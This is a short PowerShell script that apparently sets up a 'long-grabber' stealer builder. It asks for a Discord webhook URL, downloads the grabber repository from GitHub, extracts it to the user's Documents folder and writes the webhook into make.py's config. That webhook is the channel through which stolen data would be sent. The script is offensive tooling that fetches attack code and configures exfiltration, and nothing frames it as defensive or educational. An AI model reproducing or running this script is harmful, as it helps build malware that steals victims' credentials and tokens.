# Prompt user for webhook if not already set
if (-not $env:WEBHOOK) {
    $env:WEBHOOK = Read-Host "Enter Discord webhook URL"
}

# Create a temporary directory for storing the downloaded files
$TEMP_DIR = Join-Path $env:TEMP "github_downloads"
New-Item -ItemType Directory -Path $TEMP_DIR -Force | Out-Null

# Download the repository ZIP file using PowerShell with authentication
Invoke-WebRequest -Uri "https://github.com/longfen/long-grabber/archive/main.zip" -OutFile "$TEMP_DIR\repository.zip" -Credential (Get-Credential) -UseBasicParsing

# Extract the ZIP file to the Documents folder, overwriting existing folder if it exists
Expand-Archive -Path "$TEMP_DIR\repository.zip" -DestinationPath "$env:USERPROFILE\Documents" -Force

# Replace the webhook token in make.py with the provided webhook
$MAKE_SCRIPT = Join-Path $env:USERPROFILE "Documents\long-grabber-main\make.py"
$NEW_WEBHOOK = $env:WEBHOOK
if ($NEW_WEBHOOK) {
    (Get-Content -Path $MAKE_SCRIPT) | ForEach-Object {
        $_ -replace '__CONFIG__ = {''webhook'':''.*?''','__CONFIG__ = {''webhook'':''$NEW_WEBHOOK'','
    } | Set-Content -Path $MAKE_SCRIPT
}

# Cleanup: Delete the temporary directory
Remove-Item -Path $TEMP_DIR -Recurse -Force

Write-Host "Script execution completed."
